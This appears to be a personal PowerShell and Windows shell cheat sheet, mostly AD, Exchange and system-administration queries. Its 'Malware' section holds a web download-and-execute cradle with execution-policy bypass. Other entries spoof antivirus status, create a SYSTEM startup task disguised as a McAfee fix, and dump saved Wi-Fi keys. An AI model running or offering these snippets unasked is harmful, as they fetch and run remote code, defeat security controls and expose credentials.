# Windows Shell
### get wifi password
```netsh wlan show profile <wifiname> key=clear```

# PowerShell
PowerShell scripts and tricks

# Usefull cmdlets
## Report patch status
```
wmic qfe list brief /format:texttablewsys
```
```powershell
$Session = New-Object -ComObject Microsoft.Update.Session
$Searcher = $Session.CreateUpdateSearcher()
$HistoryCount = $Searcher.GetTotalHistoryCount()
$Updates = $Searcher.QueryHistory(0,$HistoryCount)
$Updates |  Select Title,@{l='Name';e={$($_.Categories).Name}},Date
```
## Get list of all OS in the domain
```powershell
$hosts = (Get-ADComputer -Filter 'enabled -eq "true"' -Properties Name,Operatingsystem,OperatingSystemVersion,IPv4Address,LastLogonDate -SearchBase "DC=sub,DC=domain,DC=net") |
    Select-Object -Property Name,Operatingsystem,OperatingSystemVersion,IPv4Address,LastLogonDate

$hosts  | export-csv systems.csv
```
## Get CPU and RAM load
```powershell
$totalRam = (Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum
while($true) {
    $date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $cpuTime = (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
    $availMem = (Get-Counter '\Memory\Available MBytes').CounterSamples.CookedValue
    $date + ' > CPU: ' + $cpuTime.ToString("#,0.000") + '%, Avail. Mem.: ' + $availMem.ToString("N0") + 'MB (' + (104857600 * $availMem / $totalRam).ToString("#,0.0") + '%)'
    Start-Sleep -s 2
}
```
## Sign PS1 script
see sign_ps1.ps1
## Filesystem
### Get hidden streams 
":$DATA" is normal. Everything else is not. 
```powershell
Get-Item -Path C:\path\* -Stream * | ?{$_.stream -notlike ":`$DATA"} | select FileName, Stream, Length
```

## Events
### get powershell logs
```powershell
Get-WinEvent "Microsoft-Windows-PowerShell/Operational" -Oldest | ? ID -eq 4104 | select TimeCreated, ID, Message | ft -wrap
```

## It's alive!
```powershell
 Add-Type -AN System.Speech;[System.Speech.Synthesis.SpeechSynthesizer]::new().Speak("Kill all h
umans!")
```
## Windows Domain 
## List of all properties
https://social.technet.microsoft.com/wiki/contents/articles/12037.active-directory-get-aduser-default-and-extended-properties.aspx?PageIndex=2
https://www.easy365manager.com/how-to-get-all-active-directory-user-object-attributes/
### Get enabled users
```powershell
Get-ADUser -Filter 'enabled -eq $true' | Select Name,samaccountname | Export-Csv enabled_users.csv 
```
### Get list of PCs from AD group
```powershell
$hosts = (Get-ADComputer -Filter 'enabled -eq "true"' -Properties Name,Operatingsystem,OperatingSystemVersion,IPv4Address,LastLogonDate -SearchBase "DC=my,DC=domain,DC=net") |
    Select-Object -Property Name,Operatingsystem,OperatingSystemVersion,IPv4Address,LastLogonDate

$hosts  | export-csv systems.csv
```
 or
 ```powershell
 dsquery computer "OU=Windows 10,OU=Computers,OU=,DC=,DC=net" -o rdn`
 ```
 
 ### Get list of users with local admin access
 ```powershell
Get-LocalGroupMember -name Administratoren |? {$_.ObjectClass -eq "Group"} | % {Get-ADGroupMember $_.name.Split('\')[1] -Recursive} | % {Get-ADUser $_.SamAccountName -properties Enabled, PasswordLastSet, PasswordNeverExpires, LastLogonDate, BadLogonCount, LastBadPasswordAttempt, LockedOut, BadPwdCount}  -ErrorAction SilentlyContinue | select Name, SamAccountName, Enabled, PasswordLastSet, PasswordNeverExpires, LastLogonDate, BadLogonCount, LastBadPasswordAttempt, LockedOut, BadPwdCount | Export-Csv localadmin.csv
 ```
 ```powershell
 $local_groups = Get-LocalGroupMember -name Administratoren | where {$_.ObjectClass -eq "Group"}

ForEach ($group in $local_groups){
    [array]$members += Get-ADGroupMember $group.name.Split('\')[1] -Recursive
}

$members = $members | select -Unique

ForEach ($member in $members){
    [array]$all_users += Get-ADUser $member.SamAccountName -properties Enabled, PasswordLastSet, PasswordNeverExpires, LastLogonDate, BadLogonCount, LastBadPasswordAttempt, LockedOut, BadPwdCount #-ErrorAction SilentlyContinue 
}
    
$all_users | Select Name, SamAccountName, Enabled, PasswordLastSet, PasswordNeverExpires, LastLogonDate, BadLogonCount, LastBadPasswordAttempt, LockedOut, BadPwdCount | Export-Csv localadmin6.csv -NoTypeInformation
 ```
 
 
 ### get all enabled users in the domain
 ```powershell
Get-ADUser -Filter * -Properties mail, AccountExpirationDate, LastLogonDate, PasswordExpired, PasswordLastSet, PasswordNeverExpires, Created, City | Where { $_.Enabled -eq $True} | Select Name, samaccountname, mail, AccountExpirationDate, LastLogonDate, PasswordExpired, PasswordLastSet, PasswordNeverExpires, Created, City | Export-csv C:\Temp\enabled_accounts.csv -NoTypeInformation 
 ```
 via Outlook address book
 ```powershell
[Microsoft.Office.Interop.Outlook.Application] $outlook = New-Object -ComObject Outlook.Application 
$entries = $outlook.Session.GetGlobalAddressList().AddressEntries 
$content = @()

# https://docs.microsoft.com/en-us/office/vba/api/Outlook.ExchangeUser
foreach($entry in $entries){
  $content += New-Object PsObject -property @{
   'Name' = $entry.Name
   'FirstName' = $entry.GetExchangeUser().FirstName
   'LastName' = $entry.GetExchangeUser().LastName
   'JobTitle'= $entry.GetExchangeUser().JobTitle
   'Department' = $entry.GetExchangeUser().Department
   'PrimarySmtpAddress' = $entry.GetExchangeUser().PrimarySmtpAddress
   'MobileTelephoneNumber'= $entry.GetExchangeUser().MobileTelephoneNumber
     }
}

#export to csv
$content | export-csv Outlook.csv -NoTypeInformation
```
 
 ### Get KRBTGT info
```powershell
Get-ADUser -Filter{SamAccountName -like "krbtgt*"} -Properties PasswordLastSet,msDS-KeyVersionNumber, msDS-KrbTgtLinkBl
```
note: krbtgt_XXX accoutns are owned by RODC, KeyVersion == 1 means password was never changed

## Get AV status
```powershell
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct  -ComputerName  $env:computername`
```

## Set AV status
```powershell
Set-WmiInstance -Path '\\HOSTNAME\root\SecurityCenter2:AntiVirusProduct.instanceGuid="{1006DC03-1FB1-9E52-7C81-F2FAB48962E3}"' -Argument @{productState="397312"}
```

## Autostart smtng
```powershell
$taskName = "McAfee VSEp10 fix"
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File "C:\Temp\test.ps1"'
$trigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay 00:00:30
$settings = New-ScheduledTaskSettingsSet -Compatibility Win8
$principal = New-ScheduledTaskPrincipal -UserId SYSTEM -LogonType ServiceAccount -RunLevel Highest
$definition = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings -Description "Run $($taskName) at startup"
Register-ScheduledTask -TaskName $taskName -InputObject $definition

Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue 
```

## Mail investigations
### Retrieve all rules - high level
```powershell
Get-Mailbox -ResultSize unlimited | Get-InboxRule -ErrorAction:SilentlyContinue | format-table -Autosize MailboxOwnerID,name,from,redirectto,ForwardTo > c:\Forwarding_Rules.csv	
```
### Retrieve all rules - detailed
```powershell
Get-Mailbox -ResultSize Unlimited | % {Get-InboxRule -Mailbox $_.UserPrincipalName} | Select MailboxOwnerID, Name, Description | Export-Csv allruleresults.csv -NoTypeInformation
```
```powershell
Get-Mailbox -ResultSize Unlimited | % {Get-InboxRule -Mailbox $_.UserPrincipalName | ? {($_.ForwardTo -ne $null) -or ($_.ForwardAsAttachmentTo -ne $null) -or ($_.RedirectsTo -ne $null)} } | Select MailBoxOwnerID, Name, ForwardTo, ForwardAsAttachmentTo, RedirectTo | Export-Csv allrulesenabled.csv -NoTypeInformation
```
### Check for email forwarding for one email address
```powershell
Get-Mailbox [EmailAddress] | fl ForwardingSMTPAddress,DeliverToMailboxandForward
Get-Mailbox | where {$_.ForwardingAddress -ne $null} | Select Name, ForwardingAddress, DeliverToMailboxAndForward
```
### Find all email forwarding in the domain
```powershell
Get-Mailbox -ResultSize Unlimited | Select Name, Alias, ServerName, DeliverToMailboxAndForward | where {$_.DeliverToMailboxAndForward -eq "true"} | Export-Csv ExchangeFWDlist.csv -NoTypeInformation
```
### Remove an email forward
```powershell
Set-Mailbox -Identity [EmailAddress] -DeliverToMailboxAndForward $false -ForwardingSMTPAddress $null
```
### Remove all email forwarding on the domain
```powershell
Get-Mailbox | Where {$_.ForwardingAddress -ne $null} | Set-Mailbox -ForwardingAddress $null -DeliverToMailboxAndForward $false	
```
### Send results to a CSV file
```powershell
[command]| Export-Csv c:\path\to\file.csv -NoTypeInformation	
```
## Office365
### Get MFA status
```powershell
Connect-MsolService
$User = Get-MSolUser -UserPrincipalName user@domain.com
$User.StrongAuthenticationMethods
```

## Malware
### start in memory from web cradle
```powershell
powershell.exe –ep Bypass –nop –noexit –c iex (New-Object System.Net.WebClient).DownloadString(“https://bit.ly/M@1w@r3”)
```
### start from file and avoid execution bypass policy
```powershell
gc .\test.ps1 | powershell -
```

## Install RSAT
```powershell
$currentWU = Get-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU” -Name “UseWUServer” | select -ExpandProperty UseWUServer
Set-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU” -Name “UseWUServer” -Value 0
Restart-Service wuauserv
Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online
Set-ItemProperty -Path “HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU” -Name “UseWUServer” -Value $currentWU
Restart-Service wuauserv
```

## Install WSLv2
Download the Linux [kernel update package](https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi)
```powershell
dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
# REBOOT HERE!!!!!
wsl --set-default-version 2
wsl --install -d ubuntu
```

## Get dead souls
find accounts which are enabled but are not used for a while. Look for password expiration date - if it's in the past - probably noone tried to login into this account for a while
```powershell
 Get-ADUser -filter {Enabled -eq $True -and PasswordNeverExpires -eq $False} -Properties mail, pwdLastSet, AccountExpirationDate, PasswordLastSet, DisplayName, "msDS-UserPasswordExpiryTimeComputed", Title, manager, department, employeeid  | Select-Object -Property Displayname, samaccountname, @{Name="PasswordExpiryDate";Expression={[datetime]::FromFileTime($_."msDS-UserPasswordExpiryTimeComputed")}}, Title, @{n="Manager Name";e={(Get-ADuser -identity $_.Manager -properties displayname).DisplayName}}, Department, employeeid, mail, AccountExpirationDate, PasswordLastSet | sort-object -property PasswordExpiryDate | Export-Csv -Path "c:\Temp\deadsouls.csv" -NoTypeInformation -Encoding UTF8
```

## Download multiple files with counter
```powershell
For ($i=1; $i -lt 100; $i++) {
    $link = "https://url/file-$i.pdf"
    $targetFileName = "c:\Temp\file $i.pdf"
    Invoke-WebRequest -Uri $link -OutFile $targetFileName
    }
```

## Download multiple files with list
```powershell
$urls = 'https://domain/file1.zip',
        'https://domain/file2.zip'
$targetDir = "c:\Temp\1\"
Foreach ($url in $urls) {
    $sourceFileName = $url.SubString($url.LastIndexOf('/')+1)            
    $targetFileName = $targetDir + $sourceFileName 
    Invoke-WebRequest -Uri $url -OutFile $targetFileName
    }
```
